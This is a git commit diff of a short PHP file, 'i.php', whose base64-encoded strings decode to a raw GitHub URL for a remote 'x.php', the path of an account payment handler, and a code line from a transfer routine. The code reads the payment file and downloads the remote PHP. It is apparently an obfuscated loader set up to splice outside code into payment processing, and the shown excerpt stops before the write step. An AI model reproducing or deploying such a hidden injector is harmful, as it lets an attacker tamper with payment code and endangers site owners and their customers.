463fcae7c706443daeabad36baed9f49ae2fbe37
ivanovasardina <ivanova.sardina@yandex.ru>
2015-10-30 02:00:50 +0500

    init

--- i.php
+++ i.php
@@ -1,6 +1,6 @@
 <?php
 $_u='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2YW5vdmFzYXJkaW5hL3BwcHJpdmF0ZS5naXRodWIuaW8vbWFzdGVyL3gucGhw';
-$_fn='cGFnZXMvYWNjb3VudC9fcGF5bWVudC5waHA=';
+$_fn='YWNjb3VudC9fcGF5bWVudC5waHA=';
 $_s='aWYgKCFlbXB0eSgkYXJUcmFuc2ZlclsiaGlzdG9yeUlkIl0pKQ==';
 $_f=file_get_contents(base64_decode($_fn));
 $_x=file_get_contents(base64_decode($_u));
